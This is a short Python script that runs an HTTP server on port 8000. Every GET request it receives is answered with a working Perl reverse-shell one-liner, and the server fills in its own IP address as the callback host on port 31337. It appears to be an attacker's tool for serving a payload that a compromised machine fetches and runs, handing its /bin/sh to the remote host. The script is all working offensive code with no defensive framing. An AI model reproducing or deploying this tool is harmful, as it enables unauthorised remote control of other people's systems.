#!/usr/bin/env python3

import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
 
class testHTTPServer_RequestHandler(BaseHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-type','text/plain')
        self.end_headers()
 
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/plain')
        self.end_headers()
 
        message = "perl -e 'use Socket;$i=\"%s\";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" % socket.gethostbyname(socket.gethostname())
        self.wfile.write(bytes(message, "utf8"))
        return
 
def run():
  server_address = (socket.gethostbyname(socket.gethostname()), 8000)
  httpd = HTTPServer(server_address, testHTTPServer_RequestHandler)
  httpd.serve_forever()
 
run()
